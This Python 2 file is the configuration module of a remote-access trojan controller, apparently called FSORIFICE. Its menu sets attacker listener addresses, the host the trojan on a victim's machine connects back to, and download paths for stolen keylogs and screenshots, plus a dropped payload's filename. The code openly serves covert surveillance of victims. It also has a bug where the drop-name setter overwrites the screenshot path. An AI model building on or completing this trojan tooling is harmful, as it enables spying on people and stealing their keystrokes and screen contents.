from configparser      import ConfigParser
from interface.console import ui_console
import os
import getpass

class conf_client:

    def __init__(self):
        # defining some global variables
        self.version          = "Alpha"
        self.LHOST            = ""
        self.LPORT            = 0
        self.backlog          = 0
        self.RHOST            = ""
        self.RPORT            = 0

        self.KLOGPATH         = ""
        self.SCRNPATH         = ""

        self.DROPNAME         = ""

        self.default_LHOST    = "0.0.0.0"
        self.default_LPORT    = 1366
        self.default_backlog  = 50
        self.default_RHOST    = "0.0.0.0"
        self.default_RPORT    = 0
        self.default_PASSWORD = ""

        # assign default value to global variables.
        self.LHOST            = self.default_LHOST
        self.LPORT            = self.default_LPORT
        self.backlog          = self.default_backlog
        self.RHOST            = self.default_RHOST
        self.RPORT            = self.default_RPORT

        # create an instance for configparser.
        self._cfg             = ConfigParser()
        self._ui_console      = ui_console()


    def writeto_config(self, config_path):
        self._cfg['Network']               = {}
        self._cfg['Network']['LHOST']      = str(self.LHOST)
        self._cfg['Network']['LPORT']      = str(self.LPORT)
        self._cfg['Network']['backlog']    = str(self.backlog)
        self._cfg['Network']['RHOST']      = str(self.RHOST)
        self._cfg['Network']['RPORT']      = str(self.RPORT)
        self._cfg['Modules']               = {}
        self._cfg['Modules']['KLOGPATH']   = str(self.KLOGPATH)
        self._cfg['Modules']['SCRNPATH']   = str(self.SCRNPATH)
        self._cfg['Installer']             = {}
        self._cfg['Installer']['DROPNAME'] = str(self.DROPNAME)

        with open(config_path, 'w') as self.configfile:
            self._cfg.write(self.configfile)

    def readfrom_config(self, config_path):
        self._cfg.read(config_path)
        self.LHOST    = self._cfg.get('Network', 'LHOST')
        self.LPORT    = self._cfg.getint('Network', 'LPORT')
        self.backlog  = self._cfg.getint('Network', 'backlog')
        self.RHOST    = self._cfg.get('Network', 'RHOST')
        self.RPORT    = self._cfg.getint('Network', 'RPORT')
        self.KLOGPATH = self._cfg.get('Modules', 'KLOGPATH')
        self.SCRNPATH = self._cfg.get('Modules', 'SCRNPATH')
        self.DROPNAME = self._cfg.get('Installer', 'DROPNAME')


    def get_RHOST(self):
        return self.RHOST

    def get_RPORT(self):
        return self.RPORT

    def get_KLOGPATH(self):
        return self.KLOGPATH

    def get_SCRNPATH(self):
        return self.SCRNPATH

    def get_DROPNAME(self):
        return self.DROPNAME


    def set_LHOST(self):
        self.LHOST = raw_input("[+] <Server> Please enter the server IP Address (0.0.0.0 to listen on all interface): ")
        print "[*] LHOST has been set to %s" % self.LHOST

    def set_LPORT(self):
        self.LPORT = input("[+] <Server> Which port would you like to listen on: ")
        print "[*] LPORT has been set to %i" % self.LPORT

    def set_backlog(self):
        self.backlog = input("[+] <Server> Please enter the maximum connections allowed: ")
        print "[*] backlog has been set to %i" % self.backlog

    def set_RHOST(self):
        self.RHOST = raw_input("[+] <Client> Please enter the IP Address the trojan will connect to: ")
        print "[*] RHOST has been set to %s" % self.RHOST

    def set_RPORT(self):
        self.RPORT = input("[+] <Client> Please enter the port the trojan will use: ")
        print "[*] RPORT has been set to %i" % self.RPORT

    def set_KLOGPATH(self):
        self.KLOGPATH = raw_input("[+] Default location for downloaded keylogs: ")
        print "[*] The keylog file will be downloaded to: %s by default." % self.KLOGPATH

    def set_SCRNPATH(self):
        self.SCRNPATH = raw_input("[+] Default location for downloaded screenshots: ")
        print "[*] The screenshot file will be downloaded to: %s by default." % self.SCRNPATH

    def set_DROPNAME(self):
        self.SCRNPATH = raw_input("[+] Default filename for dropped payload: ")
        print "[*] The filename of the dropped payload will be: %s by default." % self.DROPNAME


    def load_config(self, config_path):
        if os.path.isfile(config_path):
            try:
                self.readfrom_config(config_path)
                self._ui_console.note("[+] Loaded config file: " + os.path.abspath(config_path))
            except:
                self._ui_console.log("[-] Unable to load config file:" + os.path.abspath(config_path))
        else:
            try:
                self.writeto_config(config_path)
                self._ui_console.note("[+] Created config file: " + os.path.abspath(config_path))
            except:
                self._ui_console.log("[-] Unable to create config file:" + os.path.abspath(config_path))


    def configure(self):
        self._ui_console.note("[*] Please choose an item to configure:")
        print " 1) Server-side Configuration"
        print " 2) Client-side Configuration"
        print " 3) Transmission Configuration"
        print " 4) Module-related Configuration"
        print
        print "99) Main Menu"
        print

        while True:
            try:
                self.cm_choice = raw_input("[config@FSORIFICE] > ")

                if self.cm_choice == "1":
                    self._ui_console.note("[*] Configuring Server-side (attacker).")
                    self.set_LHOST()
                    self.set_LPORT()
                    self.set_backlog()

                elif self.cm_choice == "2":
                    self._ui_console.note("[*] Configuring Client-side (victim).")
                    self.set_RHOST()
                    self.set_RPORT()

                elif self.cm_choice == "3":
                    self._ui_console.note("[*] Configuring Transmission.")

                elif self.cm_choice == "4":
                    self._ui_console.note("[*] Configuring Modules.")
                    self.set_KLOGPATH()
                    self.set_SCRNPATH()
                    self.set_DROPNAME()

                elif self.cm_choice == "99":
                    # ask user whether they wish to save current config.
                    self.write_choice = raw_input("[*] Would you like to save the current config? (Y/n): ")
                    if self.write_choice == 'Y':
                        self.writeto_config('config/config.conf')
                        print "[*] Your preference has been saved. It will be loaded automatically next time when the program starts."
                        break
                    elif self.write_choice == 'n':
                        print "[-] Your preference has not been saved, but you can use it temporarily."
                        break
                    else:
                        print "[!] Error: Invalid Option."


                elif self.cm_choice == "":
                    continue

                else:
                    print "[-] Invalid Option."

            except KeyboardInterrupt:
                print "\n[-] Configuration ended as user requested."


    def print_conf(self):
        self._ui_console.note("[*] Printing current configuration:")
        print " [Network]"
        print " - LHOST    : %s" % self.LHOST
        print " - LPORT    : %d" % self.LPORT
        print " - backlog  : %d" % self.backlog
        print " - RHOST    : %s" % self.RHOST
        print " - RPORT    : %d" % self.RPORT
        print
        print " [Modules]"
        print " - KLOGPATH : %s" % self.KLOGPATH
        print " - SCRNPATH : %s" % self.SCRNPATH
        print
        print " [Installer]"
        print " - DROPNAME : %s" % self.DROPNAME
        print
